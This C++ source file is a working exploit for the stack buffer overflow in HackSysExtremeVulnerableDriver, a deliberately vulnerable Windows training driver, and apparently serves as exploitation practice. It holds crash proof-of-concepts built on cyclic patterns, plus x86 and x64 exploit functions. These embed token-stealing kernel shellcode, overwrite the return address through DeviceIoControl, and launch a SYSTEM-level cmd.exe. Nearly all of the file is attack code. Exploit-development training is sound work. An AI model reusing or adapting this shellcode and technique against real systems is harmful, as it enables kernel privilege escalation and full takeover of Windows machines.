// BufferOverflowStack.cpp : This file contains the 'main' function. Program execution begins and ends there.
//


#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>


#define handle_error(msg, error_code) \
    do  \
    {                             \
        printf("%s with error code: %d\n", msg, error_code); \
    } while (0);


void poc()
{
    do {
        HANDLE hDevice;
        // 2-bit unsigned integer. This is a flag field that indicates various access modes 
        // to use for creating and opening the file. 
        // This value SHOULD be set to 0xC0000000, meaning generic read and generic write
        hDevice = CreateFileA(
            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
            /* DWORD dwDesiredAccess */ 0xC0000000,
            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
            /* DWORD dwFlagsAndAttributes */ 0,
            /* HANDLE hTemplateFile */ NULL);
        if (hDevice == INVALID_HANDLE_VALUE)
        {
            handle_error("Open device failed!\n", GetLastError());
            break;
        }
        DWORD dwReturnedBytes = 0;
        UCHAR szInBuffer[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9";
        if (!DeviceIoControl(hDevice, 0x222003, szInBuffer, sizeof(szInBuffer), NULL, 0, &dwReturnedBytes, NULL))
        {
            handle_error("DeviceIoControl failed!\n", GetLastError());
            break;
        }
        else
        {
            printf("DeviceIoControl successfully.\n");
        }
    } while (0);
}


void exp()
{
    do {
        HANDLE hDevice;
        hDevice = CreateFileA(
            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
            /* DWORD dwDesiredAccess */ 0xC0000000,
            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
            /* DWORD dwFlagsAndAttributes */ 0,
            /* HANDLE hTemplateFile */ NULL);
        if (hDevice == INVALID_HANDLE_VALUE)
        {
            handle_error("Open device failed!\n", GetLastError());
            break;
        }
        /*
        pushad                              ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                        ; Set ZERO
        mov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread
                                            ; _KTHREAD is located at FS : [0x124]

        mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Process
        mov ecx, eax                        ; Copy current process _EPROCESS structure
        mov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
        mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
        sub eax, 0B8h
        cmp [eax + 0B4h], edx               ; Get nt!_EPROCESS.UniqueProcessId
        jne SearchSystemPID

        mov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + 0F8h], edx               ; Replace target process nt!_EPROCESS.Token
                                            ; with SYSTEM process nt!_EPROCESS.Token
        popad

        xor eax, eax			; restore environment
        pop ebp
        ret 8
        */
        ULONG ulShellcode[] = {
            0x64c03160,
            0x0124808b,
            0x408b0000,
            0xbac18950,
            0x4,
            0x00b8808b,
            0xb82d0000,
            0x39000000,
            0x0000b490,
            0x8bed7500,
            0x0000f890,
            0xf8918900,
            0x61000000,
            0xc25dc031,
            0x8
        };

        PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pEopPayload == NULL)
        {
            handle_error("VirtualAlloc", GetLastError());
            break;
        }
        RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));

        DWORD dwInBufferSize = 2080 + 4;
        UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
        if (pInBuffer == NULL)
        {
            handle_error("HeapAlloc", GetLastError());
            break;
        }
        RtlFillMemory(pInBuffer, 2080, 0x41);
        PVOID pShellcode = &pEopPayload;
        PVOID *ppShellcode = &pEopPayload;
        RtlCopyMemory(pInBuffer + 2080, ppShellcode, 4);
        DWORD dwReturnedBytes = 0;
        if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
        {
            handle_error("DeviceIoControl failed!\n", GetLastError());
            break;
        }
        else
        {
            printf("DeviceIoControl successfully.\n");
            // system("cmd.exe");
        }
        if (pInBuffer != NULL)
            HeapFree(GetProcessHeap(), 0, pInBuffer);
        if (pEopPayload != NULL)
            VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
    } while (0);
}

void poc_x64()
{
    do {
        HANDLE hDevice;
        // 2-bit unsigned integer. This is a flag field that indicates various access modes 
        // to use for creating and opening the file. 
        // This value SHOULD be set to 0xC0000000, meaning generic read and generic write
        hDevice = CreateFileA(
            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
            /* DWORD dwDesiredAccess */ 0xC0000000,
            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
            /* DWORD dwFlagsAndAttributes */ 0,
            /* HANDLE hTemplateFile */ NULL);
        if (hDevice == INVALID_HANDLE_VALUE)
        {
            handle_error("Open device failed!\n", GetLastError());
            break;
        }
        DWORD dwReturnedBytes = 0;
        UCHAR szInBuffer[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2C";
        if (!DeviceIoControl(hDevice, 0x222003, szInBuffer, sizeof(szInBuffer), NULL, 0, &dwReturnedBytes, NULL))
        {
            handle_error("DeviceIoControl failed!\n", GetLastError());
            break;
        }
        else
        {
            printf("DeviceIoControl successfully.\n");
        }
    } while (0);
}


void exp_x64()
{
    do {
        HANDLE hDevice;
        hDevice = CreateFileA(
            /* LPCSTR lpFileName */ "\\\\.\\HackSysExtremeVulnerableDriver",
            /* DWORD dwDesiredAccess */ 0xC0000000,
            /* DWORD dwShareMode */ FILE_SHARE_READ | FILE_SHARE_WRITE,
            /* LPSECURITY_ATTRIBUTES lpSecurityAttributes */ NULL,
            /* DWORD dwCreationDisposition */ OPEN_EXISTING,
            /* DWORD dwFlagsAndAttributes */ 0,
            /* HANDLE hTemplateFile */ NULL);
        if (hDevice == INVALID_HANDLE_VALUE)
        {
            handle_error("Open device failed!\n", GetLastError());
            break;
        }
        UCHAR ulShellcode[] = { 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC1, 0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2D, 0x88, 0x01, 0x00, 0x00, 0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00, 0x75, 0xEA, 0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3 };
        PVOID pEopPayload = VirtualAlloc(NULL, sizeof(ulShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pEopPayload == NULL)
        {
            handle_error("VirtualAlloc", GetLastError());
            break;
        }
        RtlCopyMemory(pEopPayload, ulShellcode, sizeof(ulShellcode));

        DWORD dwInBufferSize = 2072 + 8;
        UCHAR* pInBuffer = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInBufferSize * sizeof(UCHAR));
        if (pInBuffer == NULL)
        {
            handle_error("HeapAlloc", GetLastError());
            break;
        }
        RtlFillMemory(pInBuffer, 2072, 0x41);
        PVOID pShellcode = &pEopPayload;
        PVOID *ppShellcode = &pEopPayload;
        RtlCopyMemory(pInBuffer + 2072, ppShellcode, 8);
        DWORD dwReturnedBytes = 0;
        if (!DeviceIoControl(hDevice, 0x222003, (LPVOID)pInBuffer, dwInBufferSize, NULL, 0, &dwReturnedBytes, NULL))
        {
            handle_error("DeviceIoControl failed!\n", GetLastError());
            break;
        }
        else
        {
            printf("DeviceIoControl successfully.\n");
            system("cmd.exe");
        }
        if (pInBuffer != NULL)
            HeapFree(GetProcessHeap(), 0, pInBuffer);
        if (pEopPayload != NULL)
            VirtualFree(pEopPayload, sizeof(ulShellcode), MEM_RELEASE);
    } while (0);
}


int main()
{
#ifdef _WIN32
exp();
#endif

#ifdef _WIN64
exp_x64();
#endif
    return 0;
}
